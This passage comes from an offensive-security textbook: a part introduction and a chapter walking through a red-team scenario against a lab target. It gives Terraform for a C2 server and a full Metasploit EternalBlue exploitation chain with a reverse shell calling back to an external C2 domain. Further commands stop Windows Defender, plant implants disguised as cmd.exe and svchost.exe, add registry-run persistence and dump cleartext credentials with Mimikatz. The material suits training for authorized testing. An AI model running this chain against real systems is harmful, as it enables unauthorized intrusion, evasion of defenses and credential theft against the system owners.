PART III
OFFENSIVE SECURITY IN THE REAL WORLD
You have made it to the final section. Congratulations! The next few chapters present interesting scenarios to showcase how everything you have learned so far translates to real-world red team operations. When following along with these real-world scenarios, you’ll learn how to apply your knowledge of OSTs and offensive security infrastructure in more practical ways.

The first scenario, in Chapter 8, is based around classic exploitation utilizing the Metasploit framework. This scenario will draw from your knowledge of infrastructure configurations for C2 as well as your understanding of networks to gain access to a target. In the scenario that follows (Chapter 9), you will apply the reverse VPN infrastructure you built to a scenario where you will use the C2 framework Empire alongside the Impacket framework to gain internal access. In the final scenario (Chapter 10), you will apply your software development knowledge with your skills in phishing in order to achieve remote compromise via a custom C2 tool kit. After all this, Chapter 11 covers other C2 frameworks that support multiuser configurations useful in larger red team operations.

Tactics, Techniques, and Procedures
Going forward, our focus will be primarily on the techniques part of TTPs, but it’s useful to understand how each piece fits into the red team workflow, so I’ve defined them briefly here:

Tactics The ideas, strategies, or specific concepts used to achieve a goal. Examples include a specific move in a game of chess or a strategic play in a team-based sport.
Techniques The methods by which a tactic might be achieved, such as hiding an executable in a specific directory, or using redirectors to help obfuscate C2 communications.
Procedures The steps and processes by which the tactics and techniques are executed. Examples might be a workflow you use to carry out an operation (red team or otherwise), or the order of operations you follow to stand up infrastructure as a platform engineer.
TTPs are useful tradecraft in red teaming because they provide measurable steps; you can track your progress in a red team assessment by monitoring which TTPs you’re employing. TTPs allow a red team to conduct threat emulation, the process of imitating a real-world threat by trying to think and act like a known threat actor would. Unlike a penetration tester, who is usually trying to identify technical vulnerabilities, a red team member is goal oriented, just like an actual criminal. If a criminal attacks an organization, for example, they’re doing it for a specific reason and with a particular goal in mind, even if that goal is just to cause widespread chaos.

When an organization is mature enough for a red team assessment, it means that organization has identified real-world criminal threats that might target it. Based on these threats and the associated goals, a red team can develop a threat model and organize its TTPs into a step-by-step plan that precisely emulates the real threat. Whether the goal involves a “smash and grab” operation to compromise systems and steal data from an office or a stealthier operation targeting a specific user’s credentials, the TTPs provide a means by which to measure the success of the engagement.

Generally speaking, red teams should stick to their TTPs, but with some caveats. If your rules of engagement allow you to get creative on the fly to evade detection, you should take advantage of those opportunities; you should always do whatever it takes (within reason) to achieve the goal. Adhering to the TTPs, however, helps your client measure their defensive capabilities against certain types of adversaries.

Practical Red Teaming Scenarios
In the following chapters, you’ll explore three practical scenarios that demonstrate how to build out infrastructure for a simulated red team operation:

Scenario 1: Classic exploitation

You’ll begin with a basic scenario involving a classic exploitation event. You’ll stand up a simple C2 server using Metasploit to catch shells from a target with a known vulnerability. When this target system connects to your C2 server over the internet, you’ll shift perspectives from the engineering role to a red team role to see how your efforts setting up the technical infrastructure now support your red team operations.

Scenario 2: Reverse VPN tunneling

In this scenario, you’ll revisit the reverse VPN tunneling concept from Chapter 6, deploying a dropbox to exploit a system. You’ll use a C2 server running PowerShell Empire to manage your implant payloads and callbacks from the compromised system.

Scenario 3: Phishing

You’ll take things up a notch in this social engineering scenario, using Gophish to set up a phishing campaign that delivers a custom C2 implant to your target. This implant will call back to a C2 redirector—which you’ll configure with the Serverless Framework via AWS Lambda functions—that forwards connections to your custom C2 server.

These scenarios are followed by a final chapter that introduces the concept of multiple users working together using shared C2 servers. This “multiplayer” approach has many benefits and is unique to offensive security operations—more similar to setting up a video game server than to implementing traditional corporate infrastructure.

These scenarios reflect situations you’ll likely encounter in real-world offensive security engagements, and as such, they’re structured to mirror the planning and execution of actual red team operations.

Red Team Engineering
8 EXPLOITATION WITH METASPLOIT
Table of contents collapsed

Skip to Content
Search for books, courses, events, and more
Search for books, courses, events, and more
8
EXPLOITATION WITH METASPLOIT
The No Starch Press iron logo
In this first scenario, you’ll be acting as part of a red team assessment that’s identified a system vulnerable to MS17-010 (EternalBlue), a widespread security flaw in Microsoft’s SMB protocol that allows for remote code execution on Windows systems. This scenario depicts a type of event you’re likely to encounter in your offensive security career and gives you practical experience setting up and using a real external C2 server. You’ll follow the typical red team methodology after the reconnaissance phase: gaining access, maintaining access, and then acting on the objective, which, in this case, is to harvest a cleartext password.

In this scenario and the ones that follow, you are operating as the engineer. In this case, you are paired with an operator who has snuck into the client organization’s building and connected their laptop to the local network. Once they identify a foothold in the system, they’ll work with you to establish remote access through an external C2 server. Having external access means if they get caught and have to make a quick escape, they can do so without losing progress since the compromised systems will be connected to your C2 infrastructure rather than to their personal laptop. You’ll also manually conduct some post-exploitation activities, though in a real-world engagement you’d want to script these as much as possible in order to maintain access, especially with an unstable exploit like MS17-010.

To follow along with this example, I recommend using the Metasploit-able 3 virtual machine from Rapid7 (https://github.com/rapid7/metasploitable3), which is already vulnerable to MS17-010 among other security flaws. Alter-natively, you can manually generate a Meterpreter payload and run it on any of the provided Vagrant VMs to simulate a successful shell connection to the C2 server you create.

Gaining Access: Configuring a C2 Server with Terraform
You’ll configure your C2 server by using the base-c2 directory at https://github.com/3ndG4me/Offensive-Security-Engineering. The provided Terraform code will spin up a C2 server with ports configured to catch shells, building on Offensive Security’s Kali Linux repository, which comes preconfigured with many of the tools you’ll need. The Terraform code will also automatically install additional tools you’ll need for the next scenarios, so the setup process will take slightly longer compared to the other scripts. Most of this code you’ve seen previously:

resource "aws_security_group" "c2_group" {
  name        = "c2_group"
  description = "Allow ports for C2 listeners and SSH access"

  # Open common web ports for C2.
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # Some more 1337 ports for C2 for fun.
  ingress {
    from_port   = 1337
    to_port     = 1339
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port    = 31337
    to_port      = 31337
    protocol     = "tcp"
    cidr_blocks  = ["0.0.0.0/0"]
  }

# Armitage Teamserver port for multiplayer; might want to restrict by IP.
  ingress {
    from_port   = 55553
    to_port     = 55553
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # C2 to ports that are over 9000; also for fun.
  ingress {
    from_port   = 9001
    to_port     = 9999
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # Wide range of arbitrary ports including some nonstandard web ports for C2.
  ingress {
    from_port   = 8080
    to_port     = 9090
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # SSH for remote access; might want to lock down your IP prior to
  # rolling out.
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.access_addr]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_instance" "primary_c2" {
  ami             = data.aws_ami.kali.id
  instance_type   = "t2.micro"
  security_groups = [aws_security_group.c2_group.name]
  key_name        = "primary-c2-key"

  provisioner "file" {
    source      = "c2_setup.sh"
    destination = "/tmp/c2_setup.sh"
    connection {
          110 type        = "ssh"
          111 user        = "kali"
          112 private_key = file("~/.ssh/primary-c2-key.pem")
          113 host        = self.public_ip
    }
  }

  provisioner "remote-exec" {
    inline = ["chmod +x /tmp/c2_setup.sh && sudo /tmp/c2_setup.sh"]
    connection {
          120 type        = "ssh"
          121 user        = "kali"
          122 private_key = file("~/.ssh/primary-c2-key.pem")
          123 host        = self.public_ip
    }
  }

  tags = {
    Name = "Primary C2"
  }
}

output "IP" {
  value = aws_instance.primary_c2.public_ip
}
The main difference from what you’ve seen before is that you’re opening quite a few more ports, like 80 and 443, for C2 activities. At the end of the listing, the provisioner statement sets up a remote-exec action that will run any code you want after the server is spun up. If you wanted to automate the Salt Project setup from Chapter 7, this is a good starting point. In this case, remote-exec is running the c2_setup.sh script from the base-c2 directory.

To execute this code, run terraform apply. When it completes, you should see an IP address to access the server, as shown here:

Apply complete! Resources: 2 added, 0 changed, 0 destroyed.

Outputs:
IP = 3.21.114.20
With your C2 server host up and running, you’re ready to spin up Metasploit as your C2 server. Metasploit is a fantastic tool for offensive security operations and comes with Kali Linux. It’s quite common, though, so it’s easily detected in most real-world scenarios unless your payloads are sufficiently obfuscated. For this scenario, we’ll assume your target lacks both advanced EDR and proper patch management.

Spinning Up Metasploit on a C2 Server
Before you start Metasploit, you should ensure that your C2 instance will persist even if you lose SSH access. The simplest way is to use tmux, a tool that comes preinstalled with the provided scripts and keeps your terminal sessions running even when disconnected. Connect to your C2 server via SSH and create a new tmux session as follows:

user@localhost:~/Offensive-Security-Engineering/base-c2$ ssh -i ~/.ssh/primary-c2-key.pem
kali@3.21.114.20
ec2-user@kali:~$ tmux new -s name
<tmux session established>
Now if your SSH connection drops, you won’t lose your shells or C2 process. Next, start Metasploit:

ec2-user@kali:~$ sudo msfconsole
Figure 8-1 shows the output you should see.

msfconsole output with database warning, ASCII cow saying “Metasploit,” version 5.0.71-dev, and module counts including 1962 exploits and 558 payloads.
Figure 8-1: Starting the default Metasploit instance

After you start Metasploit, you’ll need to configure the multi/handler module to receive and manage C2 connections. At this point, however, you don’t know the sort of payload you need to be handling. One solution is to use the generic/all payload listener, but this can have mixed results depending on the shell being caught. Fortunately, your onsite operator has given you some reconnaissance data about the target system:

msf6 exploit(windows/smb/ms17_010_eternalblue) > check
[*] 192.168.2.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check

[+] 192.168.2.104:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional
7601 Service Pack 1 x64 (64-bit)
[*] 192.168.2.104:445 - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.2.104:445 - The target is vulnerable.
It looks like the target is an x64-bit Windows 7 system, so you’ll tell your operator to use the x64-bit Meterpreter reverse TCP payload.

Setting Up the Exploit Callback
Configure your listener for this payload and get it started as follows:

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):
Name      Current Setting  Required  Description
----      ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The Listen address (an interface may be specified)
LPORT     4444             yes       The Listen port

Exploit target:
Id  Name
--  ----
0   Wildcard Target

msf6 exploit(multi/handler) > set LHOST eth0
LHOST => 172.31.19.92
Msf6 exploit(multi/handler) > ifconfig
[*] exec: ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 9001
      inet 172.31.19.92  netmask 255.255.240.0  broadcast 172.31.31.255
      inet6 fe80::4bd:c7ff:fe60:f878  prefixlen 64  scopeid 0x20<Link>
      ether 06:bd:c7:60:f0:78  txqueuelen 1000  (Ethernet)
      RX packets 78085  bytes 109490673 (104.4 MiB)
      RX errors 0  dropped 0  overruns 0  frame 0
      TX packets 33941  bytes 3107080 (2.9 MiB)
      TX errors 0  dropped 0  overruns 0  carrier 0  collisions 0

lo:   flags=73<UP,LOOPBACK,RUNNING> mtu 65536
      inet 127.0.0.1  netmask 255.0.0.0
      inet6 ::1  prefixlen 128  scopeid 0x10<host>
      loop  txqueuelen 1000  (Local Loopback)
      RX packets 4  bytes 156 (156.0 B)
      RX errors 0  dropped 0  overruns 0  frame 0
      TX packets 4  bytes 156 (156.0 B)
      TX errors 0  dropped 0  overruns 0  carrier 0  collisions 0

msf6 exploit(multi/handler) > set LPORT 80
LPORT => 80

msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
After specifying the PAYLOAD, you set LHOST to eth0 (your server’s public IP address) and LPORT to 80, since your operator has confirmed that port 443 is restricted. Although you could use an HTTPS payload to make traffic more closely resemble web traffic, this simple reverse TCP payload is sufficient because Meterpreter payloads are already encrypted. Finally, you set ExitOnSession to false so your listener stays active even after you get a successful connection, which allows you to keep catching shells without restarting the listener job. Start the exploit handler as follows:

msf6 exploit(multi/handler) > exploit -j

[*] Exploit running as background job 0.

[*] Exploit completed, but no session was created.
[+] Started reverse TCP handler on 172.31.19.92:80
NOTE
You could have manually specified the IP address for LHOST instead, but remember, in a real-world engagement you’d want to script as much as possible. In addition, eth0 is better for automation because it works even if the IP address changes between server deployments.

Exploiting the Target
Your operator can now safely exploit their target by configuring the payload to connect to your C2 server. For this book’s scenarios, I’ve configured a domain name of test-c2.injection.sh instead of manually setting the public IP address. Either option works, but using the domain name is more flexible because you can point it to different C2 servers without changing your payload configuration, whereas the IP address might change as you spin up new servers for evasion. That approach also helps in this particular scenario, as the operator will be running an exploit that needs to eventually call out to a different remote system (the cloud-based Metasploit handler you deployed). Run the exploit as follows:

msf6 exploit(multi/handler) > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.2.104
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST test-c2.injection.sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 80
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):
Name           Current Setting  Required  Description
----           ---------------  --------  -----------
RHOSTS         192.168.2.104    yes       The target host(s), range CIDR identifier,
                                          or hosts file with syntax 'file:<path>'
RPORT          445              yes       The target port (TCP)
SMBDomain      *                no        (Optional) The Windows domain to use for
                                          authentication
SMBPass        no               no        (Optional) The password for the specified username
SMBUser        no               no        (Optional) The username to authenticate as
VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):
Name        Current Setting        Required  Description
----        ---------------        --------  -----------
EXITFUNC    thread                yes       Exit technique (Accepted: '', seh, thread,
                                            process, none)
LHOST       test-c2.injection.sh  yes       The Listen address (an interface may be specified)
LPORT       80                    yes       The Listen port

Exploit target:
Id  Name
--  ----
0   Windows 7 and Server 2008 R2 (x64) ALL Service Packs
They launch the exploit, and you get a shell. Step one of "gain access" has been achieved.
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[-] Handler failed to bind to 3.21.114.20:80: --
[*] Started reverse TCP handler on 0.0.0.0:80
[*] 192.168.2.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
...
msf6 exploit(multi/handler) >
[*] Sending stage (206403 bytes) to 75.62.72.13
Back on the C2 server, you should see a new session open:

[*] Meterpreter session 2 opened (172.31.19.92:80 -> 75.62.72.13:58495) at
    2025-04-18 21:36:27 +0000
Note that although the handler initially binds to your internal IP (172.31.19.92), it will bind to 0.0.0.0 after the exploit runs, to accept connections from any interface.

Maintaining Access: Establishing Persistence with Metasploit
The MS17-010 exploit can be a little unstable, so to maintain access you need to act quickly by migrating your shell. In a real-world operation, you would have used the prepend migrate option to do this automatically right after execution, but here you’ll do it manually. To do so, you simply identify another target process that is running as NT/Authority SYSTEM and inject into that process with the migrate command. If you look at the running processes, PID 1364 (a SYSTEM-level svchost.exe process) seems like a good target, as a service process is less likely to be terminated than a user process. Migrate your shell to that process as follows:

meterpreter > ps
...
592  472  svchost.exe          x64   8  NT AUTHORITY\SYSTEM
668  472  svchost.exe          x64   8  NT AUTHORITY\NETWORK SERVICE
760  472  svchost.exe          x64   8  NT AUTHORITY\LOCAL SERVICE
800  472  svchost.exe          x64   0  NT AUTHORITY\SYSTEM
824  472  svchost.exe          x64   0  NT AUTHORITY\SYSTEM
944  472  svchost.exe          x64   0  NT AUTHORITY\LOCAL SERVICE
1028 472  svchost.exe          x64   0  NT AUTHORITY\LOCAL SERVICE
1164 472  svchost.exe          x64   0  NT AUTHORITY\SYSTEM
1200 472  svchost.exe          x64   0  NT AUTHORITY\LOCAL SERVICE
1364 472  svchost.exe          x64   0  NT AUTHORITY\SYSTEM
                                        C:\Windows\system32\svchost.exe
1548 472  spoolsv.exe          x64   0  NT AUTHORITY\SYSTEM
                                        C:\Windows\System32\spoolsv.exe
1580 472  wmpnetwk.exe         x64   0  NT AUTHORITY\NETWORK SERVICE
1604 472  taskhost.exe         x64   1  Biggie-PC\Biggie
                                        C:\Windows\system32\taskhost.exe

                                        C:\Windows\system32\Dwm.exe

                                        C:\Windows\Explorer.EXE

                                        C:\Windows\system32\inetsrv\w3wp.exe

                                        C:\Windows\system32\LogonUI.exe
2880 472  sppsvc.exe           x64   0  NT AUTHORITY\NETWORK SERVICE

meterpreter > migrate 1364
[*] Migrating from 1548 to 1364...
[+] Migration completed successfully.
With your shell stabilized, you can focus on maintaining access. Your operator will stay onsite until you can confirm your persistence is working, after which they can safely and confidently move on to new targets.

Following the principle that “one shell is none, and two shells is one,” now you’ll create two additional sessions for redundancy. You need to be careful here, however: Although you have a Meterpreter shell successfully running in memory, this next step requires writing new implants to disk. Though the process list doesn’t show any obvious defensive processes and any existing EDR seems weak, you should still proceed with caution. Weak EDR might still detect disk-based implants, even if your kernel-level exploit bypassed it initially.

Disabling Windows Defender
If you drop into a command shell, you can manually check whether Windows Defender (or Microsoft Defender) is enabled, even if it’s not obvious in the process list:

meterpreter > shell
Process 3692 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32 > sc query windefend
sc query windefend

SERVICE_NAME: windefend
    TYPE               : 26  WIN32_SHARE_PROCESS
    STATE              : 4  RUNNING
                        (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
    WIN32_EXIT_CODE    : 0  (0x0)
    SERVICE_EXIT_CODE  : 0  (0x0)
    CHECKPOINT         : 0x0
    WAIT_HINT          : 0x0
In this case, it looks like Windows Defender is enabled. It’s a good thing you checked, because even older versions of Windows Defender can often detect Meterpreter payloads on disk!

You’re far from stuck, though. Since you have administrator privileges on this system, you can simply disable Windows Defender:

C:\Windows\system32 > sc stop windefend
sc stop windefend

SERVICE_NAME: windefend
    TYPE               : 20  WIN32_SHARE_PROCESS
    STATE              : 4  RUNNING
                        (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
    WIN32_EXIT_CODE    : 0  (0x0)
    SERVICE_EXIT_CODE  : 0  (0x0)
    CHECKPOINT         : 0x0
    WAIT_HINT          : 0x0

C:\Windows\system32>sc query windefend
sc query windefend

SERVICE_NAME: windefend
    TYPE               : 20  WIN32_SHARE_PROCESS
    STATE              : 1  STOPPED
    WIN32_EXIT_CODE    : 0  (0x0)
    SERVICE_EXIT_CODE  : 0  (0x0)
    CHECKPOINT         : 0x0
    WAIT_HINT          : 0x0
Generating a Meterpreter Payload
As noted previously, the target doesn’t seem to regularly patch its systems, nor does it have any extra security tools. At best, it has local logs on the system, but you could easily clear these to cover your tracks. Still, you should be careful. After disabling Windows Defender, you can’t just drop virus.exe on your target and call it a win. Instead, you should choose inconspicuous locations and process names that blend in with normal system activity.

Since cmd.exe is a common Windows system binary, you’ll use that name for an implant binary that points back to your C2 server the same way your exploit payload did. Background your Meterpreter session and generate the exploit as follows:

msf6 payload(windows/x64/meterpreter/reverse_tcp) > options

Module options (payload/windows/x64/meterpreter/reverse_tcp):
Name       Current Setting      Required  Description
----       ---------------      --------  -----------
EXITFUNC   process              yes       Exit technique (Accepted: '', seh, thread,
                                          process, none)
LHOST                           yes       The Listen address (an interface may be specified)
LPORT      4444                 yes       The Listen port

msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LHOST test-c2.injection.sh
LHOST => test-c2.injection.sh

msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LPORT 80
LPORT => 80

msf6 payload(windows/x64/meterpreter/reverse_tcp) > generate -f exe -o cmd.exe
[*] Writing 7168 bytes to cmd.exe...
Next, reconnect to your Meterpreter session and navigate to the C:\Windows\ directory. You want to be sure to store your binary in a directory that doesn’t contain the real cmd.exe. Although that would be a clever way to get a shell back every time someone tries to run Command Prompt, it would also raise suspicion if the Command Prompt suddenly stopped working. In your existing session, upload your new implant binary and execute it twice to create your two additional shells:

meterpreter > upload cmd.exe
[*] uploading : cmd.exe -> cmd.exe
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): cmd.exe -> cmd.exe
[*] uploaded : cmd.exe -> cmd.exe
meterpreter > shell
Process 1788 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows>.\cmd.exe
.\cmd.exe

C:\Windows>

[*] Sending stage (206403 bytes) to 75.62.72.13
[*] Meterpreter session 2 opened (172.31.19.92:80 -> 75.62.72.13:58354) at
2025-04-18 23:21:50 +0000

C:\Windows>.\cmd.exe
.\cmd.exe

C:\Windows>[*] Sending stage (206403 bytes) to 75.62.72.13
[*] Meterpreter session 3 opened (172.31.19.92:80 -> 75.62.72.13:58355) at
2025-04-18 23:21:54 +0000

msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions

Now that you’ve established multiple sessions, you’ve met the minimum redundancy requirements and can set up some actual persistence as insurance in the event that the system goes offline.

Configuring Persistence Options
Return to msfconsole once again and type search persistence to view your persistence options. You’ll be presented with many options for several platforms:

...
   35  post/windows/manage/persistence_exe                     .                normal     No

/local/motd_persistence
msf6 >
The windows/local/persistence_service module is generally a solid choice, as it creates a fairly reliable Windows service task that’s well hidden other than log entries related to the service creation and execution. To keep the persistence mechanism simple, though, you’ll instead use the windows/local/persistence module, which creates a registry key to execute your implant in a specific directory at system startup:

msf6 payload(windows/x64/meterpreter/reverse_tcp) > use 37
msf6 exploit(windows/local/persistence) > options

Module options (exploit/windows/local/persistence):
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
DELAY       10               yes       Delay (in seconds) for persistent payload to
                                       keep reconnecting back.
EXE_NAME    no               no        The filename for the payload to be used on the
                                       target host (%RAND%.exe by default).
PATH        no               no        Path to write payload (%TEMP% by default).
REG_NAME    no               no        The name to call registry value for persistence
                                       on target host (%RAND% by default).
SESSION     yes              yes       The session to run this module on.
STARTUP     USER             yes       Startup type for the persistent payload.
                                       (Accepted: USER, SYSTEM)
VBS_NAME    no               no        The filename to use for the VBS persistent
                                       script on the target host (%RAND% by default).

Exploit target:
Id  Name
--  ----
0   Windows
While more detectable, this module is also very configurable. The main options you’ll configure for this payload are EXE_NAME, PATH, STARTUP, and SESSION:

msf6 exploit(windows/local/persistence) > set EXE_NAME svchost.exe
msf6 exploit(windows/local/persistence) > set PATH C:\Windows
msf6 exploit(windows/local/persistence) > set STARTUP SYSTEM
msf6 exploit(windows/local/persistence) > set SESSION 1
msf6 exploit(windows/local/persistence) > options

Module options (exploit/windows/local/persistence):
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
DELAY       10               yes       Delay (in seconds) for persistent payload to
                                       keep reconnecting back.
EXE_NAME    svchost.exe      no        The filename for the payload to be used on the
                                       target host (%RAND%.exe by default).
PATH        C:\Windows       no        Path to write payload (%TEMP% by default).
REG_NAME    no               no        The name to call registry value for persistence
                                       on target host (%RAND% by default).
SESSION     1                yes       The session to run this module on.
STARTUP     SYSTEM           yes       Startup type for the persistent payload.
                                       (Accepted: USER, SYSTEM)
VBS_NAME    no               no        The filename to use for the VBS persistent
                                       script on the target host (%RAND% by default).

Payload options (windows/x64/meterpreter/reverse_tcp):
Name        Current Setting          Required  Description
----        ---------------          --------  -----------
EXITFUNC    process                 yes       Exit technique (Accepted: '', seh,
                                              thread, process, none)
LHOST       test-c2.injection.sh    yes       The Listen address (an interface may be
                                              specified)
LPORT       80                      yes       The Listen port

**DisablePayloadHandler: True (RHOST and RPORT settings will be ignored!)**

Exploit target:
Id  Name
--  ----
0   Windows
The other options are set to randomized values, although in real-world red team operations you’ll want to set them explicitly to more easily track your configuration and cleanup. While many Metasploit modules, including this one, provide automated cleanup features and verbose output of generated names, some community-submitted modules lack these capabilities. Always check a module’s cleanup features before using it so you can plan for artifact removal if needed.

After configuring the settings, you need to adjust the PAYLOAD that Metasploit will use to generate your persistent implant, creating a binary called svchost.exe and saving it in C:\Windows\. The settings for this implant are exactly the same as for cmd.exe.

Using the Metasploit Cleanup Automation Resource
You can now run this script and establish persistence:

msf6 exploit(windows/local/persistence) > run

[*] Running persistent module against BIGGIE-PC via session ID: 1

[+] Persistent VBS script written on BIGGIE-PC to C:\Windows\zJLhsa.vbs

[*] Installing as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\JUZGMJUL

[+] Installed autorun on BIGGIE-PC as HKLM\Software\Microsoft\Windows\CurrentVersion
    \Run\JUZGMJUL

[*] Clean up Meterpreter RC file: /root/.msf4/logs/persistence/BIGGIE-
    PC_20200418.2833/BIGGIE-PC_20200418.2833.rc
You get the friendly output you expect, along with a Metasploit resource script that can automate cleanup for you if needed.

Cleanup is an important part of any offensive security operation. If your client’s defensive team is able to catch you, the team members may also be able to handle cleanup on their own. That being said, even if they catch you, kill your process, and delete the binary, they might overlook persistent artifacts like malicious registry entries.

If you still have access after achieving your objective, clean up as soon as you’re done. Penetration testers should clean up as they go, but red teams require more persistent and longer assessments, so their cleanup processes differ. Keeping detailed notes is critical in case you lose access during the assessment.

Once the engagement is over and you no longer have access, you’ll need to work closely with the defending teams so they can identify and clean up any artifacts you’ve left behind; this is part of good red team hygiene. Maintaining rigorous documentation and cleanup protocols is not just about covering your tracks; it’s about providing value to the client by revealing potential overlooked vulnerabilities in their defensive infrastructure.

Acting on the Objective: Extracting Credentials with Mimikatz
With your persistence payload executed successfully, your operator can move on to their next task, and you can proceed to the objective: harvesting credentials. Because you’re running as SYSTEM, you’ve disabled Windows Defender, and you have a Meterpreter session open, achieving the objective is as simple as running two commands.

The first is load kiwi. Interact with one of your Meterpreter sessions again and do the following:

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/Windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oc.eo)
 ## / \ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
Success.
This loads a Windows 7 and later x64-bit compatible version of Mimikatz that you can use right in the context of your Meterpreter shell (kiwi is the Meterpreter extension name for the modern version of Mimikatz). Using load mimikatz would also work, but it is behind on features and is usually reserved for 32-bit systems and older versions of Windows.

The second command is creds_all:

meterpreter > help
...
Kiwi Commands
==============

Command                 Description
-------                 -----------
creds_all               Retrieve all credentials (parsed)
creds_kerberos          Retrieve Kerberos creds (parsed)
creds_msv               Retrieve LM/NTLM creds (parsed)
creds_ssp               Retrieve SSP creds
creds_tspkg             Retrieve TsPkg creds (parsed)
creds_wdigest           Retrieve WDigest creds (parsed)
dcsync                  Retrieve user account information via DCSync (unparsed)
dcsync_ntlm             Retrieve user account NTLM hash, SID and RID via DCSync
golden_ticket_create    Create a golden kerberos ticket
kerberos_ticket_list    List all kerberos tickets (unparsed)
kerberos_ticket_purge   Purge any in-use kerberos tickets
kerberos_ticket_use     Use a kerberos ticket
kiwi_cmd                Execute an arbitrary mimikatz command (unparsed)
lsa_dump_sam            Dump LSA SAM (unparsed)
lsa_dump_secrets        Dump LSA secrets (unparsed)
password_change         Change the password/hash of a user
wifi_list               List wifi profiles/creds for the current user
wifi_list_shared        List shared wifi profiles/creds (requires SYSTEM)
meterpreter > creds_all
You could dial in exactly what to extract with Mimikatz by using the other available options, of course, but creds_all gives you “all the credentials” that are feasibly attainable through Local Security Authority Subsystem Service (LSASS), Local Security Authority (LSA) secrets, and Security Accounts Manager (SAM) hashes.

Of course, your exact output will differ depending on the system you’re targeting for this exercise, but if you’re using something like Metasploitable 3, you’ll most certainly have obtained a cleartext password:

Username       Domain                     Password
(null)         (null)                     (null)

BIGGIE-PC$     AdminStationC              UCYwwgIKqDSR=xEa"]8]LWBSq)W./d/"fiHgn
Biggie         Biggie-PC                  biggie##

--------------------------------------
TSPKG Credentials
--------------------------------------
Username       Domain                     Password

BIGGIE-PC$     AdminStationC              UCYwwgIKqDSR=xEa"]8]LWBSq)W./d/"fiHgn
Biggie         Biggie-PC                  biggie##

--------------------------------------
Kerberos Credentials
--------------------------------------
Username       Domain                     Password

(null)          (null)                      (null)
BIGGIE-PC$     thebestrecordlabel.lab     UCYwwgIKqDSR=xEa"]8]LWBSq)W./d/"fiHgn
Biggie         Biggie-PC                  biggie##
biggie-pc$     THEBESTRECORDLABEL.LAB     UCYwwgIKqDSR=xEa"]8]LWBSq)W./d/"fiHgn
If this is a domain-joined environment (as it appears to be), you can use this password to attempt lateral moves on the network. At this point, you would hand off the credential to your onsite operator and stand by to support the operation as it progresses. Your only job now is to try not to lose the access you’ve established and to help your operator catch new shells whenever needed by repeating this process for every new target.

Summary
This scenario is one of the most common that any Red Team will experience on an engagement. Exploitation of known vulnerabilities is an excellent way to move laterally in an internal network, and if you’re lucky, it could even be a welcome foothold into the target environment. This sort of exploitation exercise leverages all the fundamental concepts of C2 and attack tool kits that you have learned about thus far.

As an extra challenge, you could try exploiting this scenario again without using Metasploit. Try to research other variants of this exploit and use one to deploy the C2 tool you built to gain the initial foothold. Regardless of what tool kit you choose to exploit any given vulnerability, the Metasploit Framework will always be a good place to start for scenarios just like this, so be sure to keep it in your tool kit.

9 DEPLOYING A DROPBOX

9
DEPLOYING A DROPBOX
The No Starch Press iron logo
